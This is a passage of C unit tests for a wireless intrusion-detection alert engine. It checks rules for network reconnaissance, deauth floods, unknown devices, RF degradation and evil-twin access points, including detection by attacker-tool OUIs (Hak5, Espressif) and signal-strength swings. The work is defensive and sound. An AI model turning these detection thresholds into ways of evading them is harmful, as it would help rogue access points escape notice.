    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    add_pnl(&s, mac, "CorpWiFi");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_MY_NETWORK_RECON);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "02:aa:bb:cc:dd:ee") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "CorpWiFi") != NULL);
    ASSERT(strstr(s.alerts[idx].key, "myrecon:02:aa:bb:cc:dd:ee") != NULL);
}

/* Association is the exoneration — the operator's own users all
 * remember the network and must not each raise an alert. */
static void test_my_net_recon_associated_client_no_fire(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6]   = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    uint8_t bssid[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    add_pnl(&s, mac, "CorpWiFi");
    add_assoc_entry(&s, mac, bssid, "CorpWiFi");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_MY_NETWORK_RECON), -1);
}

/* Exoneration by designated BSSID too, so an operator who designated
 * only BSSIDs still gets the association carve-out. */
static void test_my_net_recon_assoc_by_designated_bssid_no_fire(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    ownership_add_bssid("aa:bb:cc:00:00:01");
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6]   = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    uint8_t bssid[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    add_pnl(&s, mac, "CorpWiFi");
    /* Assoc row carries a different SSID string but our BSSID. */
    add_assoc_entry(&s, mac, bssid, "");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_MY_NETWORK_RECON), -1);
}

/* Someone else's client associated to someone else's AP must not
 * exonerate our probing stranger. */
static void test_my_net_recon_unrelated_assoc_still_fires(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6]     = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    uint8_t other[6]   = {0x02,0x11,0x22,0x33,0x44,0x55};
    uint8_t foreign[6] = {0x99,0x88,0x77,0x66,0x55,0x44};
    add_pnl(&s, mac, "CorpWiFi");
    add_assoc_entry(&s, other, foreign, "Cafe-Net");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_MY_NETWORK_RECON) >= 0);
}

/* A client remembering somebody else's network is not our business. */
static void test_my_net_recon_other_ssid_no_fire(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    add_pnl(&s, mac, "Starbucks");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_MY_NETWORK_RECON), -1);
}

/* Nothing designated -> the rule is inert. This is the default for
 * every existing deployment, so it must cost nothing and fire nothing. */
static void test_my_net_recon_no_designation_no_fire(void) {
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    add_pnl(&s, mac, "CorpWiFi");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_MY_NETWORK_RECON), -1);
}

/* Match must scan the whole PNL, not just slot 0. */
static void test_my_net_recon_matches_any_pnl_slot(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    pnl_client_t *c = &s.pnl_clients[s.pnl_count++];
    memset(c, 0, sizeof(*c));
    memcpy(c->mac, mac, 6);
    snprintf(c->ssids[0], 33, "Starbucks");
    snprintf(c->ssids[1], 33, "Airport-Free");
    snprintf(c->ssids[2], 33, "CorpWiFi");
    c->ssid_count = 3;
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_MY_NETWORK_RECON) >= 0);
}

/* An ssid_count larger than the array must not walk off the end. */
static void test_my_net_recon_clamps_ssid_count(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    add_pnl(&s, mac, "Starbucks");
    s.pnl_clients[0].ssid_count = MAX_PNL_SSIDS_PER_CLI + 50;
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_MY_NETWORK_RECON), -1);
}

/* ── flood severity scoping (#52) ───────────────────────── */

static void test_deauth_flood_on_my_bssid_escalates_crit(void) {
    alerts_clear(); ownership_clear();
    ownership_add_bssid("aa:bb:cc:00:00:01");
    sloth_state_t s; seed_state(&s);
    uint8_t dst[6]   = {0x02,0x11,0x22,0x33,0x44,0x55};
    uint8_t bssid[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    add_deauth_flood_full(&s, dst, bssid, 7, 20);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_DEAUTH_FLOOD);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "YOUR network") != NULL);
}

/* The same flood aimed elsewhere keeps its original severity — the
 * scoping must raise our case, not lower everyone else's. */
static void test_deauth_flood_elsewhere_stays_warn(void) {
    alerts_clear(); ownership_clear();
    ownership_add_bssid("aa:bb:cc:00:00:01");
    sloth_state_t s; seed_state(&s);
    uint8_t dst[6]   = {0x02,0x11,0x22,0x33,0x44,0x55};
    uint8_t other[6] = {0x99,0x88,0x77,0x66,0x55,0x44};
    add_deauth_flood_full(&s, dst, other, 7, 20);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_DEAUTH_FLOOD);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "YOUR network") == NULL);
}

/* With nothing designated, deauth severity is exactly as before. */
static void test_deauth_flood_no_designation_stays_warn(void) {
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t dst[6]   = {0x02,0x11,0x22,0x33,0x44,0x55};
    uint8_t bssid[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    add_deauth_flood_full(&s, dst, bssid, 7, 20);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_DEAUTH_FLOOD);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}


/* ── recurring transit (#54) ────────────────────────────── */

static void seed_transit(sloth_state_t *s, const uint8_t mac[6],
                         int passes, time_t now) {
    transit_device_t *d = &s->transits[s->transit_count++];
    memset(d, 0, sizeof(*d));
    memcpy(d->mac, mac, 6);
    for (int i = 0; i < passes; i++)
        d->pass_ts[d->pass_n++] = now - (long)(passes - 1 - i) * 1800;
    d->first_seen = d->pass_ts[0];
    d->last_seen  = now;
    d->best_rssi  = -44;
}

static void test_recurring_transit_fires_at_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0x01};
    seed_transit(&s, mac, TRANSIT_RECUR_THRESH, time(NULL));
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_RECURRING_TRANSIT);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "02:aa:bb:cc:dd:01") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "circling") != NULL);
    ASSERT(strstr(s.alerts[idx].key, "transit:02:aa:bb:cc:dd:01") != NULL);
}

/* Two passes is a round trip — going somewhere and coming back is what
 * roads are for. The threshold has to mean something. */
static void test_two_passes_do_not_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0x01};
    seed_transit(&s, mac, TRANSIT_RECUR_THRESH - 1, time(NULL));
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_RECURRING_TRANSIT), -1);
}

/* Passes that have aged out of the window do not count toward the
 * threshold, so yesterday's traffic cannot trip today's alert. */
static void test_stale_passes_do_not_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    time_t now = time(NULL);
    transit_device_t *d = &s.transits[s.transit_count++];
    memset(d, 0, sizeof(*d));
    d->mac[0] = 0x02;
    for (int i = 0; i < 5; i++)
        d->pass_ts[d->pass_n++] = now - TRANSIT_WINDOW_SECS - 3600 - i;
    d->last_seen = now;
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_RECURRING_TRANSIT), -1);
}

static void test_no_transits_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_RECURRING_TRANSIT), -1);
}


/* ── unknown device on a designated network (#55) ────────── */

/* The payoff from combining the roster with #52's designation. Neither
 * half alone is actionable; together they say "someone I do not
 * recognise is on my client's WiFi". */
static void test_unknown_device_on_my_network_fires(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    ownership_add_known_mac("02:00:00:00:00:01");
    sloth_state_t s; seed_state(&s);
    uint8_t stranger[6] = {0x02,0x00,0x00,0x00,0x00,0x99};
    uint8_t bssid[6]    = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    add_assoc_entry(&s, stranger, bssid, "CorpWiFi");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_UNKNOWN_DEVICE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "02:00:00:00:00:99") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "CorpWiFi") != NULL);
    ownership_clear();
}

static void test_rostered_device_does_not_fire(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    ownership_add_known_mac("02:00:00:00:00:01");
    sloth_state_t s; seed_state(&s);
    uint8_t known[6] = {0x02,0x00,0x00,0x00,0x00,0x01};
    uint8_t bssid[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    add_assoc_entry(&s, known, bssid, "CorpWiFi");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_UNKNOWN_DEVICE), -1);
    ownership_clear();
}

/* A stranger on somebody else's network is not the operator's problem
 * — that is most of a busy RF scene. */
static void test_unknown_device_on_foreign_network_no_fire(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    ownership_add_known_mac("02:00:00:00:00:01");
    sloth_state_t s; seed_state(&s);
    uint8_t stranger[6] = {0x02,0x00,0x00,0x00,0x00,0x99};
    uint8_t foreign[6]  = {0x99,0x88,0x77,0x66,0x55,0x44};
    add_assoc_entry(&s, stranger, foreign, "Cafe-Net");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_UNKNOWN_DEVICE), -1);
    ownership_clear();
}

/* BSSID designation alone is enough — an operator who listed BSSIDs
 * rather than SSIDs still gets the alert. */
static void test_unknown_device_matches_by_designated_bssid(void) {
    alerts_clear(); ownership_clear();
    ownership_add_bssid("aa:bb:cc:00:00:01");
    ownership_add_known_mac("02:00:00:00:00:01");
    sloth_state_t s; seed_state(&s);
    uint8_t stranger[6] = {0x02,0x00,0x00,0x00,0x00,0x99};
    uint8_t bssid[6]    = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    add_assoc_entry(&s, stranger, bssid, "");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_UNKNOWN_DEVICE) >= 0);
    ownership_clear();
}

/* Both inputs are required. A roster with no designation, or a
 * designation with no roster, must be completely inert — otherwise the
 * rule would fire on every device at a site where the operator supplied
 * only half the context. */
static void test_roster_without_designation_is_inert(void) {
    alerts_clear(); ownership_clear();
    ownership_add_known_mac("02:00:00:00:00:01");
    sloth_state_t s; seed_state(&s);
    uint8_t stranger[6] = {0x02,0x00,0x00,0x00,0x00,0x99};
    uint8_t bssid[6]    = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    add_assoc_entry(&s, stranger, bssid, "CorpWiFi");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_UNKNOWN_DEVICE), -1);
    ownership_clear();
}

static void test_designation_without_roster_is_inert(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    sloth_state_t s; seed_state(&s);
    uint8_t stranger[6] = {0x02,0x00,0x00,0x00,0x00,0x99};
    uint8_t bssid[6]    = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    add_assoc_entry(&s, stranger, bssid, "CorpWiFi");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_UNKNOWN_DEVICE), -1);
    ownership_clear();
}

/* Neither configured — the default for every existing deployment. */
static void test_unconfigured_is_inert(void) {
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t stranger[6] = {0x02,0x00,0x00,0x00,0x00,0x99};
    uint8_t bssid[6]    = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    add_assoc_entry(&s, stranger, bssid, "CorpWiFi");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_UNKNOWN_DEVICE), -1);
}

/* The detail flags a randomised MAC so the operator knows why the
 * address may not match anything they rostered. */
static void test_unknown_device_notes_randomised_mac(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    ownership_add_known_mac("02:00:00:00:00:01");
    sloth_state_t s; seed_state(&s);
    uint8_t stranger[6] = {0x02,0x00,0x00,0x00,0x00,0x99};
    uint8_t bssid[6]    = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    add_assoc_entry(&s, stranger, bssid, "CorpWiFi");
    s.assocs[0].sta_random = 1;
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_UNKNOWN_DEVICE);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "randomised") != NULL);
    ownership_clear();
}


/* ── channel RF degradation (roadmap B3) ────────────────── */

static void seed_channel(sloth_state_t *s, int ch, int retry_pct,
                         int badfcs_pct, uint32_t frames) {
    channel_summary_t *c = &s->channels[s->channel_count++];
    memset(c, 0, sizeof(*c));
    c->channel    = ch;
    c->retry_pct  = retry_pct;
    c->badfcs_pct = badfcs_pct;
    c->frames     = frames;
}

static void test_rf_degraded_fires_at_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_channel(&s, 6, RF_RETRY_DEGRADED_PCT, 12, 900);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_RF_DEGRADED);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "ch 6") != NULL);
    ASSERT(strstr(s.alerts[idx].key, "rfdegraded:6") != NULL);
}

static void test_rf_degraded_below_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_channel(&s, 6, RF_RETRY_DEGRADED_PCT - 1, 2, 900);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_RF_DEGRADED), -1);
}

/* -1 is "not enough frames to say" and must never be read as a ratio.
 * Treating it as a number would make every quiet channel alert. */
static void test_rf_degraded_unknown_ratio_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_channel(&s, 6, -1, -1, 3);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_RF_DEGRADED), -1);
}

/* Each channel is judged on its own. */
static void test_rf_degraded_is_per_channel(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_channel(&s, 1,  90, 30, 900);
    seed_channel(&s, 11,  3,  0, 900);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_RF_DEGRADED);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "ch 1") != NULL);
    int n = 0;
    for (int i = 0; i < s.alert_count; i++)
        if (s.alerts[i].type == ALERT_TYPE_RF_DEGRADED) n++;
    ASSERT_EQ(n, 1);
}

static void test_rf_degraded_no_channels_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_RF_DEGRADED), -1);
}

/* Same SSID + same cipher + SAME OUI — legit multi-AP enterprise / mesh
 * deployment from one vendor. Must not fire. */
static void test_evil_twin_same_cipher_same_oui_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x02};
    add_beacon(&s, "Office", a, "WPA2");
    add_beacon(&s, "Office", b, "WPA2");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN), -1);
}

/* Same SSID + DIFFERENT ciphers (WPA2 vs WPA3) + different OUI — does
 * NOT fire either branch. Cipher mismatch alone isn't enough (neither
 * side is OPEN/WEP), and the WARN branch requires same cipher.
 * Documents a known-quiet edge case. */
static void test_evil_twin_diff_cipher_same_ssid_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t b[6] = {0x11,0x22,0x33,0x00,0x00,0x02};
    add_beacon(&s, "Mixed", a, "WPA2");
    add_beacon(&s, "Mixed", b, "WPA3");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN), -1);
}

/* OPEN networks routinely show same-SSID-different-OUI siblings
 * (airports, multi-vendor hotspots). The WARN branch deliberately
 * skips OPEN to avoid false positives — there's no shared secret to
 * defend. */
static void test_evil_twin_same_open_diff_oui_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t b[6] = {0x11,0x22,0x33,0x00,0x00,0x02};
    add_beacon(&s, "Airport-Wifi", a, "OPEN");
    add_beacon(&s, "Airport-Wifi", b, "OPEN");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN), -1);
}

/* Existing CRIT path must still win when an OPEN AP sits next to a
 * WPA2 sibling with a different OUI — single alert fires, severity is
 * CRIT (not WARN). The two dedup keys ("twin:" vs "twin-fp:") differ,
 * but the cipher-mismatch precludes the WARN branch (same-enc check
 * fails), so only the CRIT key is present. */
static void test_evil_twin_open_plus_wpa2_diff_oui_still_crit(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t b[6] = {0x11,0x22,0x33,0x00,0x00,0x02};
    add_beacon(&s, "Cafe-Free", a, "OPEN");
    add_beacon(&s, "Cafe-Free", b, "WPA2");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    /* Search whole engine to confirm no WARN twin-fp alert sneaked in. */
    int seen_warn = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type == ALERT_TYPE_EVIL_TWIN &&
            s.alerts[k].sev == ALERT_SEV_WARN) seen_warn = 1;
    }
    ASSERT_EQ(seen_warn, 0);
}

/* WARN alert is symmetric — the same dedup key fires whether the
 * lower-indexed AP is BSSID A or BSSID B. (The inner loop starts at
 * i+1 specifically so we only emit one alert per pair.) */
static void test_evil_twin_same_cipher_diff_oui_pair_dedups(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Insert B before A this time; key must still be "twin-fp:<ssid>". */
    uint8_t b[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    add_beacon(&s, "Cafe-Net", b, "WPA2");
    add_beacon(&s, "Cafe-Net", a, "WPA2");
    alerts_update(&s);
    int count = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type == ALERT_TYPE_EVIL_TWIN) count++;
    }
    ASSERT_EQ(count, 1);
}

/* ── Evil-twin Phase 2: vendor-IE hash + attacker OUI escalation ─ */

/* Same-cipher diff-OUI WITH differing vendor-IE hashes → CRIT
 * (firmware mismatch — strong signal of an attacker mirroring SSID
 * but built on different silicon). */
static void test_evil_twin_vendor_hash_mismatch_escalates_crit(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t b[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "Cafe-Net", a, "WPA2");
    add_beacon(&s, "Cafe-Net", b, "WPA2");
    s.beacon_aps[0].fp.vendor_ies_hash = 0xdeadbeefu;
    s.beacon_aps[1].fp.vendor_ies_hash = 0xcafef00du;
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "vendor-IE") != NULL);
}

/* Same-cipher diff-OUI with MATCHING vendor-IE hashes → stays WARN
 * (an unusual but not damning pairing — same firmware running on
 * two different vendor OUIs, e.g. white-label silicon). */
static void test_evil_twin_vendor_hash_match_stays_warn(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t b[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "Cafe-Net", a, "WPA2");
    add_beacon(&s, "Cafe-Net", b, "WPA2");
    s.beacon_aps[0].fp.vendor_ies_hash = 0xfeedfaceu;
    s.beacon_aps[1].fp.vendor_ies_hash = 0xfeedfaceu;
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

/* One side hash zero (no vendor IE observed yet) → don't escalate.
 * Defends against false CRITs when one beacon is data-poor. */
static void test_evil_twin_vendor_hash_zero_no_escalate(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t b[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "Cafe-Net", a, "WPA2");
    add_beacon(&s, "Cafe-Net", b, "WPA2");
    s.beacon_aps[0].fp.vendor_ies_hash = 0xdeadbeefu;
    s.beacon_aps[1].fp.vendor_ies_hash = 0u;
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

/* Hak5 OUI on one side bumps WARN → CRIT even when vendor hashes
 * agree (or are absent). The Pineapple OUI alone is strong enough. */
static void test_evil_twin_hak5_oui_escalates_crit(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t legit[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t hak5[6]  = {0x00,0x13,0x37,0x44,0x55,0x66};  /* Hak5 OUI */
    add_beacon(&s, "Cafe-Net", legit, "WPA2");
    add_beacon(&s, "Cafe-Net", hak5,  "WPA2");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "attacker-tool OUI") != NULL);
}

/* Espressif OUI on one side bumps WARN → CRIT — same logic as Hak5
 * but covers ESP32-Marauder / Wi-Fi-Nugget style rogue APs. */
static void test_evil_twin_espressif_oui_escalates_crit(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t legit[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t esp[6]   = {0x24,0x0a,0xc4,0x44,0x55,0x66};  /* Espressif OUI */
    add_beacon(&s, "Cafe-Net", legit, "WPA2");
    add_beacon(&s, "Cafe-Net", esp,   "WPA2");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

/* Vendor hashes match AND no attacker OUI present → still WARN,
 * even though OUIs differ. Confirms the WARN tier still exists; the
 * escalation paths are additive, not the default. */
static void test_evil_twin_diff_oui_no_signals_stays_warn(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Neither OUI is in any attacker table; both hashes match. */
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t b[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "Mesh", a, "WPA2");
    add_beacon(&s, "Mesh", b, "WPA2");
    s.beacon_aps[0].fp.vendor_ies_hash = 0x12345678u;
    s.beacon_aps[1].fp.vendor_ies_hash = 0x12345678u;
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

/* ── Evil-twin Phase 3: RSSI-step proximity ─────────────────── */

/* 15 dBm delta fires WARN — boundary of the threshold. */
static void test_evil_twin_proximity_fires_at_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    add_beacon(&s, "Roving", bssid, "WPA2");
    s.beacon_aps[0].rssi_min_60s = -80;
    s.beacon_aps[0].rssi_max_60s = -65;   /* swing = 15 */
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN_PROXIMITY);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "aa:bb:cc:01:02:03") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "15 dBm") != NULL);
    ASSERT(strstr(s.alerts[idx].key, "twin-prox:aa:bb:cc:01:02:03") != NULL);
}

/* 14 dBm delta — one below threshold — no fire. */
static void test_evil_twin_proximity_below_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    add_beacon(&s, "Stable", bssid, "WPA2");
    s.beacon_aps[0].rssi_min_60s = -79;
    s.beacon_aps[0].rssi_max_60s = -65;   /* swing = 14 */
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN_PROXIMITY), -1);
}

/* Big swing visible (-50 → -85, 35 dBm) — still WARN, just a larger
 * delta echoed in the detail. */
static void test_evil_twin_proximity_large_swing_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "Pineapple-Mimic", bssid, "WPA2");
    s.beacon_aps[0].rssi_min_60s = -85;
    s.beacon_aps[0].rssi_max_60s = -50;   /* swing = 35 */
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN_PROXIMITY);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "35 dBm") != NULL);
}

/* rssi_min_60s == 0 means "ring not yet populated" — no fire even if
 * rssi_max_60s would imply a huge delta. Defends against false alerts
 * on initial observation. */
static void test_evil_twin_proximity_unseen_min_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    add_beacon(&s, "Bootstrap", bssid, "WPA2");
    s.beacon_aps[0].rssi_min_60s = 0;      /* sentinel: unseen */
    s.beacon_aps[0].rssi_max_60s = -50;
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN_PROXIMITY), -1);
}

/* Same as above but max is the sentinel — symmetric guard. */
static void test_evil_twin_proximity_unseen_max_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    add_beacon(&s, "Bootstrap", bssid, "WPA2");
    s.beacon_aps[0].rssi_min_60s = -90;
    s.beacon_aps[0].rssi_max_60s = 0;
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN_PROXIMITY), -1);
}

/* Per-BSSID dedup — two distinct APs both swinging produce two alerts. */
static void test_evil_twin_proximity_per_bssid(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
